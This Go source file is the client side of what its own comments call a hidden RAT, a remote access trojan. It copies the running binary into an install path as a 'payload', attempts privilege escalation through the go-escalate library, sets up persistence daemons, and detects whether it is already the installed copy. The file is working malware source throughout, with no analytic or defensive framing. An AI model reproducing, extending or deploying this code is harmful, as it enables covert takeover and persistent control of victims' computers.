// +build !android

package client

import (
	"crypto/sha256"
	"errors"
	"io/ioutil"
	"log"
	"os"

	"github.com/lu4p/go-escalate"
)

// SetupDaemon installs multiple start daemons for payload persistence
func SetupDaemon() {
	log.Println("[SetupDaemon] Passing off to Daemon installer...")
	go Persist(PathExe)
}

// installExecuteable copies the currently running executeable
// TODO: Remove duplicate source payload once RAT is installed
func installExecuteable() error {
	ex, err := os.Executable()
	if err != nil {
		log.Println("[InstallExe] [!] Couldn't find the currently running exe:", err)
		return err
	}

	data, err := ioutil.ReadFile(ex)
	if err != nil {
		log.Println("[InstallExe] [!] Couldn't read current exe:", err)
		return err
	}

	if err = os.MkdirAll(Path, os.ModePerm); err != nil {
		log.Println("[InstallExe] [!] Couldn't create path for new exe:", err)
		return err
	}

	if err = ioutil.WriteFile(PathExe, data, os.ModePerm); err != nil {
		log.Println("[InstallExe] [!] Couldn't write exe to path:", err)
		return err
	}

	return nil
}

// Elevate uses github.com/lu4p/go-escalate to attempt a privilege
// escalation on the currently running running process
// TODO: Remove duplicate payloads once a successful elevate
func Elevate() error {
	log.Println("[Elevate] Installing payload into:", PathExe)

	if err := installExecuteable(); err != nil {
		return errors.New("[Elevate] [!] Couldn't copy payload into target path")
	}
	log.Println("[Elevate] [+] Successfully copied payload into target path")

	return escalate.Escalate(PathExe)
}

// CheckExistingInstall checks if a payload has already been deployed and is the
// currently running proccess. This is needed because duplicate payloads are required
// during escalation and the installation of the hidden RAT
func CheckExistingInstall() bool {
	osExe, _ := os.Executable()
	if osExe == PathExe {
		log.Println("[CheckExisting] I AM the existing install!")
		return true
	}

	if _, err := os.Stat(PathExe); !os.IsNotExist(err) {
		currExe, _ := os.ReadFile(osExe)
		hash := sha256.New()
		if _, err := hash.Write(currExe); err != nil {
			return false
		}

		sumCurr := hash.Sum(nil)
		hash.Reset()

		installedExe, _ := os.ReadFile(PathExe)
		if _, err := hash.Write(installedExe); err != nil {
			return false
		}

		sumInstalled := hash.Sum(nil)

		if string(sumCurr) == string(sumInstalled) {
			log.Println("[CheckExisting] I am the same binary as the existing install!")
			return true
		}
	}

	log.Println("[CheckExisting] I am NOT the existing install!")
	return false
}
